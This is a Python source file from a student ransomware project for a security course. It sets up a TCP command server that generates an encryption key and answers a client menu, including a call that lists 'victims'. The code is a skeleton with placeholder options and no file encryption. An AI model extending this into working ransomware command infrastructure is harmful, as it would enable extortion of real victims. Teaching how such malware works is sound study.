#!/usr/bin/python
# --------------------------------------------

# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : network

# --------------------------------------------
# Importations
# --------------------------------------------
import socket
import threading
import security
import os
import binascii
import utile.data as udata
# --------------------------------------------
# Classes & Functions
# --------------------------------------------
class server_tcp(object):

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.encryptkey = os.urandom(32)


    def start_server(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f'$ Server started ! Waiting for clients...')
        try:
            self.s.bind((self.ip, self.port))
        except socket.error as error:
            print(str(error))
        self.s.listen(10)
        conn, addr = self.s.accept()
        print(f'[+] New TCP Connexion from ' + str(addr[0])+":"+str(addr[1]))
        # Implémentation sécurité : AES
        # Send msg without coding syntax so we can read next informations
        secu = security.SecurityLayer("Here's the key informations")
        key = secu.key
        nonce = secu.nonce
        tag = secu.authTag
        #conn.send(bytes(str(key), 'utf-8'))
        #conn.send(bytes(str(nonce), 'utf-8'))
        #conn.send(bytes(str(tag), 'utf-8'))
        while 1:
            msg = conn.recv(2048)
            print(str(addr[0]) + " >> " + str(msg))
            rs = str(self.gestion_msg(msg))
            # @Todo: Build header & send it before msg
            conn.send(bytes(rs, 'utf-8'))


    def gestion_msg(self, message):
        if message == b'1':
            return udata.list_victim()
        elif message == b'2':
            return "Todo2"
        elif message == b'3':
            return "Todo3"

srv = server_tcp("", 8380)
srv.start_server()